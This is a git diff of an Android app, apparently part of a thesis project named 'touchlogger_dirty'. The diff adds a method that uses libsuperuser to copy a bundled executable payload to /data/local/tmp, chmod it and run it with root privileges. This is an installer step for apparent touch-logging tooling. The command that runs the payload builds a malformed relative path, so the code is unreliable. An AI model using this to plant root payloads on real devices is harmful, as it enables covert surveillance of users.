@@ -31,6 +31,9 @@ import java.io.IOException;
 import java.io.PrintWriter;
 import java.io.StringWriter;
 import java.io.Writer;
+import java.util.List;
+
+import eu.chainfire.libsuperuser.Shell;
 
 import static org.leyfer.thesis.touchlogger_dirty.utils.Config.EXEC_PAYLOAD_NAME;
 import static org.leyfer.thesis.touchlogger_dirty.utils.file.FileUtils.unpackAsset;
@@ -155,7 +158,35 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private boolean installPayloadViaSu() {
-        // FIXME: utilize libsuperuser!
+        if (!Shell.SU.available()) {
+            return false;
+        }
+
+        try {
+            prepareManualInstallation();
+        } catch (ManualInstallationException e) {
+            return false;
+        }
+
+        String srcPath = new File(getFilesDir(), EXEC_PAYLOAD_NAME).getAbsolutePath();
+        String dstPath = "/data/local/tmp/exec_payload";
+        String successMessage = "success!";
+
+        List<String> suResult = Shell.SU.run(new String[]{
+                String.format("cp %s %s", srcPath, dstPath),
+                String.format("chmod 755 %s", dstPath),
+                String.format(".%s", dstPath),
+                String.format("echo %s!", successMessage)
+        });
+
+        if (suResult != null) {
+            for (String outputString : suResult) {
+                if (outputString.contains(successMessage)) {
+                    return true;
+                }
+            }
+        }
+
         return false;
     }
 
